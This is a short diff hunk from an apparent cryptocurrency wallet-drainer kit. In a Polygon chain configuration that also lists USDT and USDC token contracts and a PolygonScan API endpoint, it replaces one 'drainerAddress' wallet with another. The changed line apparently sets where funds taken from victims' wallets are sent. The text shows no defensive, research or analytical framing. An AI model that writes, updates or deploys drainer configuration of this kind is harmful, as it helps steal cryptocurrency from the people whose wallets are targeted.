@@ -57,7 +57,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "0x571ECf52126Be880c686803f9aDa40F8b878D079",
+    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
